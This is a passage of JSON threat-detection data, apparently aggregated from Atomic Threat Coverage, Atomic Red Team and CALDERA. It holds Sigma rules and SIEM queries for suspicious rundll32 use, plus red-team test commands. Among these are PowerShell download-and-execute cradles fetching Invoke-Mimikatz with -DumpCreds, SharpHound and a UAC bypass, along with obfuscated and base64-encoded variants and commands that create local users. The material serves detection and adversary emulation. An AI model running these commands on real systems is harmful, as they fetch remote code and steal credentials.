https://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1085\nauthor: juju4\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - '*\\rundll32.exe* url.dll,*OpenURL *'\n            - '*\\rundll32.exe* url.dll,*OpenURLA *'\n            - '*\\rundll32.exe* url.dll,*FileProtocolHandler *'\n            - '*\\rundll32.exe* zipfldr.dll,*RouteTheCall *'\n            - '*\\rundll32.exe* Shell32.dll,*Control_RunDLL *'\n            - '*\\rundll32.exe javascript:*'\n            - '* url.dll,*OpenURL *'\n            - '* url.dll,*OpenURLA *'\n            - '* url.dll,*FileProtocolHandler *'\n            - '* zipfldr.dll,*RouteTheCall *'\n            - '* Shell32.dll,*Control_RunDLL *'\n            - '* javascript:*'\n            - '*.RegisterXLL*'\n    condition: selection\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine.keyword:(*\\\\\\\\rundll32.exe*\\\\ url.dll,*OpenURL\\\\ * OR *\\\\\\\\rundll32.exe*\\\\ url.dll,*OpenURLA\\\\ * OR *\\\\\\\\rundll32.exe*\\\\ url.dll,*FileProtocolHandler\\\\ * OR *\\\\\\\\rundll32.exe*\\\\ zipfldr.dll,*RouteTheCall\\\\ * OR *\\\\\\\\rundll32.exe*\\\\ Shell32.dll,*Control_RunDLL\\\\ * OR *\\\\\\\\rundll32.exe\\\\ javascript\\\\:* OR *\\\\ url.dll,*OpenURL\\\\ * OR *\\\\ url.dll,*OpenURLA\\\\ * OR *\\\\ url.dll,*FileProtocolHandler\\\\ * OR *\\\\ zipfldr.dll,*RouteTheCall\\\\ * OR *\\\\ Shell32.dll,*Control_RunDLL\\\\ * OR *\\\\ javascript\\\\:* OR *.RegisterXLL*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-Rundll32-Activity <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious Rundll32 Activity\",\\n    \"description\": \"Detects suspicious process related to rundll32 based on arguments\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.execution\",\\n      \"attack.t1085\"\\n    ],\\n    \"query\": \"CommandLine.keyword:(*\\\\\\\\\\\\\\\\rundll32.exe*\\\\\\\\ url.dll,*OpenURL\\\\\\\\ * OR *\\\\\\\\\\\\\\\\rundll32.exe*\\\\\\\\ url.dll,*OpenURLA\\\\\\\\ * OR *\\\\\\\\\\\\\\\\rundll32.exe*\\\\\\\\ url.dll,*FileProtocolHandler\\\\\\\\ * OR *\\\\\\\\\\\\\\\\rundll32.exe*\\\\\\\\ zipfldr.dll,*RouteTheCall\\\\\\\\ * OR *\\\\\\\\\\\\\\\\rundll32.exe*\\\\\\\\ Shell32.dll,*Control_RunDLL\\\\\\\\ * OR *\\\\\\\\\\\\\\\\rundll32.exe\\\\\\\\ javascript\\\\\\\\:* OR *\\\\\\\\ url.dll,*OpenURL\\\\\\\\ * OR *\\\\\\\\ url.dll,*OpenURLA\\\\\\\\ * OR *\\\\\\\\ url.dll,*FileProtocolHandler\\\\\\\\ * OR *\\\\\\\\ zipfldr.dll,*RouteTheCall\\\\\\\\ * OR *\\\\\\\\ Shell32.dll,*Control_RunDLL\\\\\\\\ * OR *\\\\\\\\ javascript\\\\\\\\:* OR *.RegisterXLL*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:(*\\\\\\\\\\\\\\\\rundll32.exe*\\\\\\\\ url.dll,*OpenURL\\\\\\\\ * OR *\\\\\\\\\\\\\\\\rundll32.exe*\\\\\\\\ url.dll,*OpenURLA\\\\\\\\ * OR *\\\\\\\\\\\\\\\\rundll32.exe*\\\\\\\\ url.dll,*FileProtocolHandler\\\\\\\\ * OR *\\\\\\\\\\\\\\\\rundll32.exe*\\\\\\\\ zipfldr.dll,*RouteTheCall\\\\\\\\ * OR *\\\\\\\\\\\\\\\\rundll32.exe*\\\\\\\\ Shell32.dll,*Control_RunDLL\\\\\\\\ * OR *\\\\\\\\\\\\\\\\rundll32.exe\\\\\\\\ javascript\\\\\\\\:* OR *\\\\\\\\ url.dll,*OpenURL\\\\\\\\ * OR *\\\\\\\\ url.dll,*OpenURLA\\\\\\\\ * OR *\\\\\\\\ url.dll,*FileProtocolHandler\\\\\\\\ * OR *\\\\\\\\ zipfldr.dll,*RouteTheCall\\\\\\\\ * OR *\\\\\\\\ Shell32.dll,*Control_RunDLL\\\\\\\\ * OR *\\\\\\\\ javascript\\\\\\\\:* OR *.RegisterXLL*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious Rundll32 Activity\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine.keyword:(*\\\\\\\\rundll32.exe* url.dll,*OpenURL * *\\\\\\\\rundll32.exe* url.dll,*OpenURLA * *\\\\\\\\rundll32.exe* url.dll,*FileProtocolHandler * *\\\\\\\\rundll32.exe* zipfldr.dll,*RouteTheCall * *\\\\\\\\rundll32.exe* Shell32.dll,*Control_RunDLL * *\\\\\\\\rundll32.exe javascript\\\\:* * url.dll,*OpenURL * * url.dll,*OpenURLA * * url.dll,*FileProtocolHandler * * zipfldr.dll,*RouteTheCall * * Shell32.dll,*Control_RunDLL * * javascript\\\\:* *.RegisterXLL*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"*\\\\\\\\rundll32.exe* url.dll,*OpenURL *\" OR CommandLine=\"*\\\\\\\\rundll32.exe* url.dll,*OpenURLA *\" OR CommandLine=\"*\\\\\\\\rundll32.exe* url.dll,*FileProtocolHandler *\" OR CommandLine=\"*\\\\\\\\rundll32.exe* zipfldr.dll,*RouteTheCall *\" OR CommandLine=\"*\\\\\\\\rundll32.exe* Shell32.dll,*Control_RunDLL *\" OR CommandLine=\"*\\\\\\\\rundll32.exe javascript:*\" OR CommandLine=\"* url.dll,*OpenURL *\" OR CommandLine=\"* url.dll,*OpenURLA *\" OR CommandLine=\"* url.dll,*FileProtocolHandler *\" OR CommandLine=\"* zipfldr.dll,*RouteTheCall *\" OR CommandLine=\"* Shell32.dll,*Control_RunDLL *\" OR CommandLine=\"* javascript:*\" OR CommandLine=\"*.RegisterXLL*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine IN [\"*\\\\\\\\rundll32.exe* url.dll,*OpenURL *\", \"*\\\\\\\\rundll32.exe* url.dll,*OpenURLA *\", \"*\\\\\\\\rundll32.exe* url.dll,*FileProtocolHandler *\", \"*\\\\\\\\rundll32.exe* zipfldr.dll,*RouteTheCall *\", \"*\\\\\\\\rundll32.exe* Shell32.dll,*Control_RunDLL *\", \"*\\\\\\\\rundll32.exe javascript:*\", \"* url.dll,*OpenURL *\", \"* url.dll,*OpenURLA *\", \"* url.dll,*FileProtocolHandler *\", \"* zipfldr.dll,*RouteTheCall *\", \"* Shell32.dll,*Control_RunDLL *\", \"* javascript:*\", \"*.RegisterXLL*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*.*\\\\rundll32\\\\.exe.* url\\\\.dll,.*OpenURL .*|.*.*\\\\rundll32\\\\.exe.* url\\\\.dll,.*OpenURLA .*|.*.*\\\\rundll32\\\\.exe.* url\\\\.dll,.*FileProtocolHandler .*|.*.*\\\\rundll32\\\\.exe.* zipfldr\\\\.dll,.*RouteTheCall .*|.*.*\\\\rundll32\\\\.exe.* Shell32\\\\.dll,.*Control_RunDLL .*|.*.*\\\\rundll32\\\\.exe javascript:.*|.*.* url\\\\.dll,.*OpenURL .*|.*.* url\\\\.dll,.*OpenURLA .*|.*.* url\\\\.dll,.*FileProtocolHandler .*|.*.* zipfldr\\\\.dll,.*RouteTheCall .*|.*.* Shell32\\\\.dll,.*Control_RunDLL .*|.*.* javascript:.*|.*.*\\\\.RegisterXLL.*)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious Call by Ordinal\nid: e79a9e79-eb72-4e78-a628-0e7e8f59e89c\ndescription: Detects suspicious calls of DLLs in rundll32.dll exports by ordinal\nstatus: experimental\nreferences:\n    - https://techtalk.pcmatic.com/2017/11/30/running-dll-files-malware-analysis/\n    - https://github.com/Neo23x0/DLLRunner\n    - https://twitter.com/cyb3rops/status/1186631731543236608\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1085\nauthor: Florian Roth\ndate: 2019/10/22\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine: '*\\rundll32.exe *,#*'\n    condition: selection\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\n    - Windows contol panel elements have been identified as source (mmc)\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious Call by Ordinal\nid: e79a9e79-eb72-4e78-a628-0e7e8f59e89c\ndescription: Detects suspicious calls of DLLs in rundll32.dll exports by ordinal\nstatus: experimental\nreferences:\n    - https://techtalk.pcmatic.com/2017/11/30/running-dll-files-malware-analysis/\n    - https://github.com/Neo23x0/DLLRunner\n    - https://twitter.com/cyb3rops/status/1186631731543236608\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1085\nauthor: Florian Roth\ndate: 2019/10/22\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine: '*\\rundll32.exe *,#*'\n    condition: selection\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\n    - Windows contol panel elements have been identified as source (mmc)\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine.keyword:*\\\\\\\\rundll32.exe\\\\ *,#*", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-Call-by-Ordinal <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious Call by Ordinal\",\\n    \"description\": \"Detects suspicious calls of DLLs in rundll32.dll exports by ordinal\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.execution\",\\n      \"attack.t1085\"\\n    ],\\n    \"query\": \"CommandLine.keyword:*\\\\\\\\\\\\\\\\rundll32.exe\\\\\\\\ *,#*\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:*\\\\\\\\\\\\\\\\rundll32.exe\\\\\\\\ *,#*\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious Call by Ordinal\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine.keyword:*\\\\\\\\rundll32.exe *,#*", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "CommandLine=\"*\\\\\\\\rundll32.exe *,#*\"", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine=\"*\\\\\\\\rundll32.exe *,#*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^.*\\\\rundll32\\\\.exe .*,#.*'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "ET POLICY RunDll Request Over SMB - Likely Lateral Movement", "product": "Suricata (NSM)", "name": "ET Open Rule"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1086/T1086.yaml", "command": "powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\"\n", "name": null}, {"source": "atomics/T1086/T1086.yaml", "command": "powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound\"\n", "name": null}, {"source": "atomics/T1086/T1086.yaml", "command": "(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))\n(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()\nSet-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))\n", "name": null}, {"source": "atomics/T1086/T1086.yaml", "command": "$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\\Software\\Microsoft\\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr\n", "name": null}, {"source": "atomics/T1086/T1086.yaml", "command": "Powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe'\"\n", "name": null}, {"source": "atomics/T1086/T1086.yaml", "command": "New-LocalUser -FullName '#{full_name}' -Name '#{user_name}' -Password ATOM1CR3DT3@M -Description '#{description}'\n", "name": null}, {"source": "atomics/T1086/T1086.yaml", "command": "New-LocalUser -FullName '#{full_name}' -Name 'atomic_user' -Password ATOM1CR3DT3@M -Description '#{description}'\n", "name": null}, {"source": "atomics/T1086/T1086.yaml", "command": "New-LocalUser -FullName '#{full_name}' -Name '#{user_name}' -Password #{password} -Description 'Atomic Things'\n", "name": null}, {"source": "atomics/T1086/T1086.yaml", "command": "New-LocalUser -FullName 'Atomic Red Team' -Name '#{user_name}' -Password #{password} -Description 'Atomic Things'\n", "name": null}, {"source": "atomics/T1086/T1086.yaml", "command": "powershell.exe IEX -exec bypass -windowstyle hidden -noprofile \"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText\"\n", "name": null}, {"source": "atomics/T1086/T1086.yaml", "command": "powershell.exe -exec bypass -noprofile \"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText\"\n", "name": null}, {"source": "atomics/T1086/T1086.yaml", "command": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -exec bypass -windowstyle hidden -noprofile \"$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.xml');$Xml.command.a.execute | IEX\"\n", "name": null}, {"source": "atomics/T1086/T1086.yaml", "command": "\"C:\\Windows\\system32\\cmd.exe\" /c \"mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/mshta.sct').Exec();close()\"\n", "name": null}, {"source": "atomics/T1086/T1086.yaml", "command": "# Encoded payload in next command is the following \"Set-Content -path \"$env:SystemRoot/Temp/art-marker.txt\" -value \"Hello from the Atomic Red Team\"\"\nreg.exe add \"HKEY_CURRENT_USER\\Software\\Classes\\AtomicRedTeam\" /v ART /t REG_SZ /d \"U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=\"\niex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\\Software\\Classes\\AtomicRedTeam').ART)))\n", "name": null}, {"source": "atomics/T1086/T1086.yaml", "command": "powershell.exe -version 2 -Command Write-Host $PSVersion\n", "name": null}, {"source": "atomics/T1086/T1086.yaml", "command": "Add-Content -Path $env:TEMP\\NTFS_ADS.txt -Value 'Write-Host \"Stream Data Executed\"' -Stream 'streamCommand'\n$streamcommand = Get-Content -Path $env:TEMP\\NTFS_ADS.txt -Stream 'streamcommand'\nInvoke-Expression $streamcommand\n", "name": null}, {"source": "data/abilities/collection/4d9b079c-9ede-4116-8b14-72ad3a5533af.yml", "command": {"windows": {"psh,pwsh": {"command": "get-process >> $env:APPDATA\\vmtools.log;\ncat $env:APPDATA\\vmtools.log\n"}}}, "name": "Capture running processes via PowerShell"}, {"source": "data/abilities/collection/55678719-e76e-4df9-92aa-10655bbd1cf4.yml", "command": {"windows": {"psh": {"command": "cmd.exe /c \"net user\" >> C:\\Windows\\temp\\history.log;\ncmd.exe /c \"whoami /priv\" >> C:\\Windows\\temp\\history.log;\ncmd.exe /c \"netstat -ano\" >> C:\\Windows\\temp\\history.log;"}}}, "name": "User enumeration"}, {"source": "data/abilities/collection/702bfdd2-9947-4eda-b551-c3a1ea9a59a2.yml", "command": {"windows": {"psh,pwsh": {"command": "powershell.exe -c \"Get-WmiObject -class win32_operatingsystem | select -property * | export-csv msdebug.log\";"}}}, "name": "System Information Gathering Script"}, {"source": "data/abilities/collection/7c42a30c-c8c7-44c5-80a8-862d364ac1e4.yml", "command": {"windows": {"psh,pwsh": {"command": "echo $(get-uac)\n"}}}, "name": "Determine whether or not UAC is enabled"}, {"source": "data/abilities/defense-evasion/e5f9de8f-3df1-4e78-ad92-a784e3f6770d.yml", "command": {"windows": {"psh": {"command": "Copy-Item C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Windows\\Temp\\debug.exe;\nC:\\Windows\\Temp\\debug.exe get-process >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe get-localgroup >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe get-localuser >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion >> C:\\Windows\\temp\\debug.log;\n"}}}, "name": "Copy powershell to non-standard location and perform triage commands"}, {"source": "data/abilities/execution/315cedf1-4a3a-4015-b63f-149d64bacbbc.yml", "command": {"windows": {"psh,pwsh": {"cleanup": "Remove-Item -Force -Path \".\\Emulate-Administrator-Tasks.ps1\"\n", "command": "start powershell.exe -ArgumentList \"-NoP\",\"-StA\",\"-ExecutionPolicy\",\"bypass\",\".\\Emulate-Administrator-Tasks.ps1\"\n", "payload": "Emulate-Administrator-Tasks.ps1"}}}, "name": "Emulate administrator tasks on a system in a separate process"}, {"source": "data/abilities/execution/bfff9006-d1fb-46ce-b173-92cb04e9a031.yml", "command": {"windows": {"psh": {"command": "powershell.exe -c IEX (New-Object Net.Webclient).downloadstring(\"https://bit.ly/33H0QXi\") \n"}}}, "name": "Download"}, {"source": "data/abilities/execution/ccdb8caf-c69e-424b-b930-551969450c57.yml", "command": {"windows": {"psh": {"command": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ARQBtAHAAaQByAGUAUAByAG8AagBlAGMAdAAvAEUAbQBwAGkAcgBlAC8ANwBhADMAOQBhADUANQBmADEAMgA3AGIAMQBhAGUAYgA5ADUAMQBiADMAZAA5AGQAOAAwAGMANgBkAGMANgA0ADUAMAAwAGMAYQBjAGIANQAvAGQAYQB0AGEALwBtAG8AZAB1AGwAZQBfAHMAbwB1AHIAYwBlAC8AYwByAGUAZABlAG4AdABpAGEAbABzAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAiACkAOwAgACQAbQAgAD0AIABJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAOwAgACQAbQAKAA==\n"}}}, "name": "Download"}, {"source": "data/abilities/execution/eb814e03-811a-467a-bc6d-dcd453750fa2.yml", "command": {"windows": {"psh": {"command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadFile(\"https://download.sysinternals.com/files/PSTools.zip\", \"PSTools.zip\");\nNew-Item -ItemType \"directory\" C:\\Windows\\System32\\PSTools -Force;\nAdd-Type -Assembly 'System.IO.Compression.FileSystem'; [System.IO.Compression.ZipFile]::ExtractToDirectory(\"PSTools.zip\", \"C:\\Windows\\System32\\PSTools\");\n"}}}, "name": "Download and install PSTools by unzipping the file"}, {"source": "Threat Hunting Tables", "command": "excel.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "cmd.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "powershell.exe", "name": "sub_process_2"}, {"source": "Threat Hunting Tables", "command": "excel.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "powershell.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "mshta.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "cmd.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "powershell.exe", "name": "sub_process_2"}, {"source": "Threat Hunting Tables", "command": "mshta.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "powershell.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "powerpoint.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "cmd.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "powershell.exe", "name": "sub_process_2"}, {"source": "Threat Hunting Tables", "command": "powerpoint.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "powershell.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "powershell.exe webClient.DownloadString(", "name": null}, {"source": "Threat Hunting Tables", "command": "powershell.exe webClient.DownloadFile", "name": null}, {"source": "Threat Hunting Tables", "command": "powershell.exe webClient.DownloadData", "name": null}, {"source": "Threat Hunting Tables", "command": "winword.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "powershell.exe", "name": "sub_process_1"}, {"source": "SysmonHunter - PowerShell", "command": "hidden|-enc|-NonI\\\\Windows\\\\.+\\\\WindowsPowerShell\\\\.+\\\\powershell.exe", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/invoke_psremoting", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/invoke_psremoting", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/spawn", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/spawn", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/management/multi/spawn", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/management/multi/spawn", "name": "Empire Module Command"}], "command_list": ["powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\"\n", "powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound\"\n", "(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))\n(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()\nSet-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ 